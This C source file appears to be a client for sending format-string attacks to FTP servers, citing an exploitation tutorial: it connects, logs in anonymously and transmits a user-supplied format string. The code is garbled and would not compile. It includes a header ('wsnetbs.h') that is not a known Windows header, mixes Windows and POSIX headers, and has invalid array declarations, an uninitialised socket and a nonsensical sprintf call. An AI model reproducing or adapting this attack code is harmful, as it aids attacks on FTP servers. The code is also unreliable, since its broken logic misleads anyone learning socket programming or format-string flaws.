#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <errno.h>

#include <wsnetbs.h>
#include <ws2tcpip.h>

#include <wininet.h>
#include <winnetwk.h>

#include <winnt.h>
#include <unistd.h>

#define h_addr h_addr_list[0] // Backwards compatibility - allows the use of h_addr

// Error Information Leakage tutorial by Anley, Heasman, Linder & Richarte
// Sample C Socket Programs - ZOS Communications Servers by IBM

int argc;
char *argv[];

int serverconnector(char *host) {
    struct hostent *hostName;
    struct sockaddr_in clientCL;

    unsigned short port;

    int buffer[] = 1024 * 64;
    int sock;

    argv[0] = send(sock, host, buffer, 0);
    hostName = gethostbyname(argv[1]);
    port = (unsigned short) atoi(argv[2]);

    if (host==NULL||host==(char)0) {
        fprintf(stderr, "INVALID Hostname\n");
        exit(1);
    }

    if (clientCL.sin_addr.s_addr=inet_addr(host)==-1) {
        if (hostName=gethostbyname(host)==NULL) {
                fprintf(stderr, "Cannot resolve for %s\n", host);
                exit(1);
        }

        memcpy(clientCL.sin_addr.s_addr = *((unsigned long *)hostName->h_addr),
            hostName->h_addr, sizeof(clientCL.sin_addr.s_addr));
    }

    if ((sock=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))==-1) {
        fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
        exit(1);
    }

    clientCL.sin_family=PF_INET;
    clientCL.sin_port=htons(port);

    if (connect(sock, (struct sockaddr*)&clientCL, sizeof(clientCL))==-1) {
        fprintf(stderr, "Cannot connect to %s: %s\n", host, strerror(errno));
    }
    
    return sock;
}

int serverreceiver(int *s, int p) {
    int returnValue;
    int i = 1024 * 64;
    char msg; msg*=i;
    char buff[] = msg;
    
    memset(buff, 0, i);
    returnValue = recv(s, buff, i, 0);

    if (returnValue>0)
    {
        if(p)
            printf("buff:msg << %s:%s", buff, msg);
    } else {
            if (p)
        printf("int print << output << %s", p);
        return 0;
    }
    
    return 1;
}

int ftpsender(int s, char *msg) {
    send(s, msg, strlen(msg), 0);
    return 1;
}

char syntaxmsg() {
    printf("Syntax in <host> <format string>\n");
    return 1;
}

int socketclose(int s) {
    int sock;
    s = close(sock);
    printf("Socket closing ...");
    exit(0);
}

int main(int margc, char *margv[])
{
    margc = argc;
    *margv = *argv;

    int s;
    char buffer[1024 * 64];
    char temp[4096];
    char msg;

    if (margc!=4)
        return syntaxmsg();

    s = serverconnector(margv[1]);

    if(s<=0)
        _Exit(1);

    serverreceiver(s, 0);
    ftpsender(s, "User: Anonymous\n");
    serverreceiver(s, 0);
    ftpsender(s, "Pass: example@email.com");
    serverreceiver(s, 0);

    if(atoi(margv[3])==1) {
        printf("Input - waiting ...\n");
        getc(stdin);
    }

    strcat(buffer, msg);
    sprintf(temp, msg, margv);
    strcat(buffer, temp);
    ftpsender(s, buffer);
    serverreceiver(s, 0);

    socketclose(s);
    shutdown(SOCK_STREAM, 0);

    return 1;
}